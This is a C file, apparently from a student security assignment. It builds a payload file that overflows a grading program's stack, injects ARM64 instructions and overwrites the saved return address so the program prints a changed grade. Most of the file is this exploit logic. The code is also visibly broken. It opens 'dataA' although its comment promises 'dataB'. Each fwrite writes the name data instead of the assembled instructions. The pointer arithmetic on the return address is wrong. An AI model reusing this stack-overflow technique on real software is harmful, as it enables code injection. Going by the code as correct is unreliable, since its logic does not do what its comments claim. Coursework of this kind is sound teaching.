/*--------------------------------------------------------------------*/
/* Produces a file called dataB with the student name, a nullbyte,    */
/* padding to overrun the stack, and the address of the instruction   */
/* in main to get a B, the latter of which will overwrite getName's   */
/* stored x30.                                                        */
/*                                                                    */
/* Authors: Maxwell Lloyd and Venus Dinari                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.c"

int main(void){
   FILE *psFile;
   unsigned long ulData;
   unsigned int ulInstruction;
   unsigned long pAAttack;
   int i;

   psFile = fopen("dataA", "w");

   /* Writes the new x30 for getName to skip to our assembly */
   pAAttack = 0x420058;
   
   /* Writes the student's names */
   ulData = 0x00006E655678614D;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* mov w0, 'A'   */
   ulInstruction = MiniAssembler_mov(0, 10);
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* adr x1, grade */
   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 8 + 4);
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* strb wo, [x1] */
   ulInstruction = MiniAssembler_strb(0, 1);
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* b  printf     */
   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 8 + 12);
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);


   /* Writes the null byte at the end of the instructions */
   for (i = 0; i < 24; i++)
      putc(0x00, psFile); /* Writes '00000000' */

   fwrite(&pAAttack + 8, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}